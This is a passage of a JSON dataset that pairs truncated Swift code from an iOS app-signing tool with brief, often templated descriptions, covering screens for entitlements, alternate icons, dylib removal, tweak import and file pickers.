    "code_type": "function"
  },
  {
    "id": "3067",
    "code": "private func filterEntitlements(with searchText: String) {\nif searchText.isEmpty {",
    "nl": "Function filterEntitlements - implements filterentitlements functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3068",
    "code": "extension Array {\nsubscript(safe index: Index) -> Element? {",
    "nl": "MARK: - Safe Array Access Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3069",
    "code": "extension SigningDataWrapper {\n// Add an accessor to get to the SigningOptions\nvar signingOptionsWithEntitlements: SigningOptions {",
    "nl": "MARK: - SigningDataWrapper Extension Extension to provide customEntitlements access",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3070",
    "code": "extension SigningOptions {\n/// Helper to access entitlements through additionalData\nfunc getEntitlementsFromAdditionalData() -> [String: Any]? {",
    "nl": "Helper extension to store entitlements",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3071",
    "code": "func getEntitlementsFromAdditionalData() -> [String: Any]? {\nguard let entitlementsJson = additionalData?[\"customEntitlements\"] else {",
    "nl": "/ Helper to access entitlements through additionalData",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3072",
    "code": "mutating func setEntitlementsToAdditionalData(_ entitlements: [String: Any]?) {\nif additionalData == nil {",
    "nl": "/ Helper to store entitlements in additionalData",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/EntitlementsEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3073",
    "code": "struct SettingsAltIconView: View {\n@Environment(\\.dismiss) var dismiss\n\nprivate let mainOptions: SigningMainDataWrapper\nprivate let applicationPath: URL\n\ninit(mainOptions: SigningMainDataWrapper, app: URL) {",
    "nl": "struct SettingsAltIconView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift",
    "code_type": "struct"
  },
  {
    "id": "3074",
    "code": "extension SettingsAltIconView {\n// im not making this better, I may be reusing code but I dont carfe\nprivate func loadDefaultIcon() -> String? {",
    "nl": "extension SettingsAltIconView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift",
    "code_type": "extension"
  },
  {
    "id": "3075",
    "code": "private func loadDefaultIcon() -> String? {\nlet infoPlistPath = applicationPath.appendingPathComponent(\"Info.plist\")\nguard let infoPlist = NSDictionary(contentsOf: infoPlistPath),\nlet iconDict = infoPlist[\"CFBundleIcons\"] as? [String: Any],\nlet primaryIcon = iconDict[\"CFBundlePrimaryIcon\"] as? [String: Any],\nlet files = primaryIcon[\"CFBundleIconFiles\"] as? [String],\nlet iconPath = files.first\nelse {",
    "nl": "im not making this better, I may be reusing code but I dont carfe",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift",
    "code_type": "function"
  },
  {
    "id": "3076",
    "code": "private func loadAlternateIcons() -> [String: String] {\nlet infoPlistPath = applicationPath.appendingPathComponent(\"Info.plist\")\nguard let infoPlist = NSDictionary(contentsOf: infoPlistPath),\nlet iconDict = infoPlist[\"CFBundleIcons\"] as? [String: Any],\nlet alternateIcons = iconDict[\"CFBundleAlternateIcons\"] as? [String: [String: Any]]\nelse {",
    "nl": "Function loadAlternateIcons - implements loadalternateicons functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift",
    "code_type": "function"
  },
  {
    "id": "3077",
    "code": "private struct IconButton: View {\nlet iconPath: String\nlet name: String\nlet applicationPath: URL\nlet action: () -> Void\n\nvar body: some View {",
    "nl": "struct IconButton - implements functionality related to icon button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SettingsAltIconView.swift",
    "code_type": "struct"
  },
  {
    "id": "3078",
    "code": "class SigningsAdvancedViewController: FRSITableViewController {\nprivate var toggleOptions: [TogglesOption]\n\noverride init(signingDataWrapper: SigningDataWrapper, mainOptions: SigningMainDataWrapper) {",
    "nl": "class SigningsAdvancedViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3079",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntableData = [\n[String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_APPEARENCE\")],\n[String.localized(\"APP_SIGNING_INPUT_VIEW_CONTROLLER_SECTION_TITLE_MINIMUM_APP_VERSION\")],\n[\"Custom Entitlements\"],\n[],\n]\n",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3080",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\n\n// Add LED effects to important cells\nDispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { [weak self] in",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3081",
    "code": "private func addLEDEffectsToImportantCells() {\n// Get visible cells to apply effects only to what the user can see\nlet visibleCells = tableView.visibleCells\n\nfor cell in visibleCells {",
    "nl": "/ Add LED effects to highlight important settings cells",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3082",
    "code": "extension SigningsAdvancedViewController {\noverride func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "extension SigningsAdvancedViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3083",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .gray\n\nlet cellText = tableData[indexPath.section][indexPath.row]\ncell.textLabel?.text = cellText\n\nswitch cellText {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3084",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet cellText = tableData[indexPath.section][indexPath.row]\n\nif cellText == \"Custom Entitlements\" {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3085",
    "code": "extension SigningsAdvancedViewController {\n@objc private func forceLightDarkAppearenceDidChange(_ sender: UISegmentedControl) {",
    "nl": "extension SigningsAdvancedViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3086",
    "code": "@objc private func forceLightDarkAppearenceDidChange(_ sender: UISegmentedControl) {\nsigningDataWrapper.signingOptions.forceLightDarkAppearence =\nmainOptions.mainOptions.forceLightDarkAppearenceString[sender.selectedSegmentIndex]\n}\n\n@objc private func forceMinimumVersionDidChange(_ sender: UISegmentedControl) {",
    "nl": "Function forceLightDarkAppearenceDidChange - implements forcelightdarkappearencedidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3087",
    "code": "@objc private func forceMinimumVersionDidChange(_ sender: UISegmentedControl) {\nsigningDataWrapper.signingOptions.forceMinimumVersion =\nmainOptions.mainOptions.forceMinimumVersionString[sender.selectedSegmentIndex]\n}\n\n@objc func toggleOptionsSwitches(_ sender: UISwitch) {",
    "nl": "Function forceMinimumVersionDidChange - implements forceminimumversiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3088",
    "code": "@objc func toggleOptionsSwitches(_ sender: UISwitch) {\nswitch sender.tag {",
    "nl": "Function toggleOptionsSwitches - implements toggleoptionsswitches functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsAdvancedViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3089",
    "code": "class SigningsDylibViewController: UITableViewController {\nvar applicationPath: URL\nvar groupedDylibs: [String: [String]] = [:]\nvar dylibSections: [String] = [\"@rpath\", \"@executable_path\", \"/usr/lib\", \"/System/Library\", \"Other\"]\nvar dylibstoremove: [String] = [] {",
    "nl": "class SigningsDylibViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3090",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupViews()\nsetupNavigation()\ndylibstoremove = mainOptions.mainOptions.removeInjectPaths\n}\n\nfileprivate func setupViews() {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3091",
    "code": "fileprivate func setupViews() {\ntableView.dataSource = self\ntableView.delegate = self\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"dylibCell\")\n\nlet alertController = UIAlertController(\ntitle: \"ADVANCED USERS ONLY\",\nmessage: \"This section can make installed applications UNUSABLE and potentially UNSTABLE. USE THIS SECTION WITH CAUTION, IF YOU HAVE NO IDEA WHAT YOU'RE DOING, PLEASE LEAVE.\\n\\nIF YOU MAKE AN ISSUE ON THIS, IT WILL IMMEDIATELY BE CLOSED AND IGNORED.\",\npreferredStyle: .alert\n)",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3092",
    "code": "fileprivate func setupNavigation() {\ntitle = \"Remove Dylibs\"\n}\n\nfileprivate func groupDylibs(_ dylibs: [String]) {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3093",
    "code": "fileprivate func groupDylibs(_ dylibs: [String]) {\ngroupedDylibs[\"@rpath\"] = dylibs.filter { $0.hasPrefix(\"@rpath\") }",
    "nl": "Function groupDylibs - implements groupdylibs functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3094",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn dylibSections.count\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3095",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nlet key = dylibSections[section]\nreturn groupedDylibs[key]?.count ?? 0\n}\n\noverride func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3096",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nreturn dylibSections[section]\n}\n\noverride func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3097",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"dylibCell\", for: indexPath)\nlet key = dylibSections[indexPath.section]\nif let dylib = groupedDylibs[key]?[indexPath.row] {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3098",
    "code": "override func tableView(\n_ tableView: UITableView,\ncommit editingStyle: UITableViewCell.EditingStyle,\nforRowAt indexPath: IndexPath\n) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsDylibViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3099",
    "code": "class SigningsInputViewController: UITableViewController {\nvar parentView: SigningsViewController\nvar initialValue: String\nvar valueToSaveTo: Int\nprivate var changedValue: String?\n\nprivate lazy var textField: UITextField = {",
    "nl": "class SigningsInputViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3100",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nnavigationItem.largeTitleDisplayMode = .never\ntitle = initialValue.capitalized\n\nlet saveButton = UIBarButtonItem(\ntitle: String.localized(\"SAVE\"),\nstyle: .done,\ntarget: self,\naction: #selector(saveButton)",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3101",
    "code": "@objc func saveButton() {\nswitch valueToSaveTo {",
    "nl": "Function saveButton - implements savebutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3102",
    "code": "@objc private func textDidChange() {\nnavigationItem.rightBarButtonItem?.isEnabled = !(textField.text?.isEmpty ?? true)\nchangedValue = textField.text\n}\n\noverride func numberOfSections(in _: UITableView) -> Int { return 1 }",
    "nl": "Function textDidChange - implements textdidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3103",
    "code": "override func numberOfSections(in _: UITableView) -> Int { return 1 }\noverride func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3104",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int { return 1 }\n\noverride func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3105",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"InputCell\", for: indexPath)\nswitch indexPath.section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsInputViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3106",
    "code": "class SigningsTweakViewController: UICollectionViewController, UICollectionViewDelegateFlowLayout {\nvar tweaksToInject: [String] = [] {",
    "nl": "class SigningsTweakViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3107",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\ntitle = String.localized(\"APP_SIGNING_TWEAK_VIEW_CONTROLLER_TITLE\")\nnavigationItem.largeTitleDisplayMode = .never\ncollectionView.register(\nProductCollectionViewCell.self,\nforCellWithReuseIdentifier: ProductCollectionViewCell.reuseIdentifier\n)\n\nnavigationItem.rightBarButtonItem = UIBarButtonItem(",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3108",
    "code": "@objc func openDocuments() {\nimportFile()\n}\n\n@available(*, unavailable)\nrequired init?(coder _: NSCoder) {",
    "nl": "Function openDocuments - implements opendocuments functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3109",
    "code": "extension SigningsTweakViewController {\noverride func numberOfSections(in _: UICollectionView) -> Int {",
    "nl": "extension SigningsTweakViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3110",
    "code": "override func numberOfSections(in _: UICollectionView) -> Int {\nreturn 1\n}\n\noverride func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3111",
    "code": "override func collectionView(_: UICollectionView, numberOfItemsInSection _: Int) -> Int {\nreturn tweaksToInject.count\n}\n\nfunc collectionView(\n_ collectionView: UICollectionView,\nlayout collectionViewLayout: UICollectionViewLayout,\nsizeForItemAt _: IndexPath\n) -> CGSize {",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3112",
    "code": "func collectionView(\n_ collectionView: UICollectionView,\nlayout collectionViewLayout: UICollectionViewLayout,\nsizeForItemAt _: IndexPath\n) -> CGSize {",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3113",
    "code": "override func collectionView(_ collectionView: UICollectionView,\ncellForItemAt indexPath: IndexPath) -> UICollectionViewCell\n{",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3114",
    "code": "override func collectionView(\n_: UICollectionView,\ncontextMenuConfigurationForItemAt indexPath: IndexPath,\npoint _: CGPoint\n) -> UIContextMenuConfiguration? {",
    "nl": "Function collectionView - implements collectionview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3115",
    "code": "extension SigningsTweakViewController: UIDocumentPickerDelegate {\nfunc importFile() {",
    "nl": "extension SigningsTweakViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3116",
    "code": "func importFile() {\npresentDocumentPicker(fileExtension: [\nUTType(filenameExtension: \"deb\")!,\nUTType(filenameExtension: \"dylib\")!,\n])\n}\n\nfunc presentDocumentPicker(fileExtension: [UTType]) {",
    "nl": "Function importFile - implements importfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3117",
    "code": "func presentDocumentPicker(fileExtension: [UTType]) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)\ndocumentPicker.delegate = self\ndocumentPicker.allowsMultipleSelection = false\npresent(documentPicker, animated: true, completion: nil)\n}\n\nfunc documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {",
    "nl": "Function presentDocumentPicker - implements presentdocumentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3118",
    "code": "func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\nguard let selectedFileURL = urls.first else { return }",
    "nl": "Function documentPicker - implements documentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3119",
    "code": "func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {\ncontroller.dismiss(animated: true, completion: nil)\n}\n}\n\nclass ProductCollectionViewCell: UICollectionViewCell {",
    "nl": "Function documentPickerWasCancelled - implements documentpickerwascancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3120",
    "code": "class ProductCollectionViewCell: UICollectionViewCell {\nstatic let reuseIdentifier = \"ProductCell\"\n\nlet imageView: UIImageView = {",
    "nl": "class ProductCollectionViewCell - implements functionality related to product collection view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3121",
    "code": "private func setupViews() {\ncontentView.addSubview(stackView)\ncontentView.backgroundColor = .quaternarySystemFill\ncontentView.layer.cornerRadius = 19\ncontentView.layer.cornerCurve = .continuous\ncontentView.layer.masksToBounds = true\n\nNSLayoutConstraint.activate([\nstackView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 16),\nstackView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 8),",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsTweakViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3122",
    "code": "extension SigningsViewController: UIDocumentPickerDelegate & UIImagePickerControllerDelegate,\nUINavigationControllerDelegate\n{",
    "nl": "extension SigningsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "extension"
  },
  {
    "id": "3123",
    "code": "func importAppIconFile() {\nlet actionSheet = UIAlertController(title: \"Select App Icon\", message: nil, preferredStyle: .actionSheet)\n\nlet altIconAction = UIAlertAction(title: \"Select Alt Icon\", style: .default) { _ in",
    "nl": "Function importAppIconFile - implements importappiconfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3124",
    "code": "func presentDocumentPicker(fileExtension: [UTType]) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)\ndocumentPicker.delegate = self\ndocumentPicker.allowsMultipleSelection = false\npresent(documentPicker, animated: true, completion: nil)\n}\n\nfunc documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {",
    "nl": "MARK: - Documents",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3125",
    "code": "func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\nguard let selectedFileURL = urls.first else { return }",
    "nl": "Function documentPicker - implements documentpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3126",
    "code": "func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {\ncontroller.dismiss(animated: true, completion: nil)\n}\n\n// MARK: - Library\n\nfunc presentPhotoLibrary(mediaTypes: [String]) {",
    "nl": "Function documentPickerWasCancelled - implements documentpickerwascancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3127",
    "code": "func presentPhotoLibrary(mediaTypes: [String]) {\nlet imagePicker = UIImagePickerController()\nimagePicker.delegate = self\nimagePicker.sourceType = .photoLibrary\nimagePicker.mediaTypes = mediaTypes\npresent(imagePicker, animated: true, completion: nil)\n}\n\nfunc imagePickerController(\n_ picker: UIImagePickerController,",
    "nl": "MARK: - Library",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3128",
    "code": "func imagePickerController(\n_ picker: UIImagePickerController,\ndidFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey: Any]\n) {",
    "nl": "Function imagePickerController - implements imagepickercontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3129",
    "code": "func imagePickerControllerDidCancel(_ picker: UIImagePickerController) {\npicker.dismiss(animated: true, completion: nil)\n}\n}\n",
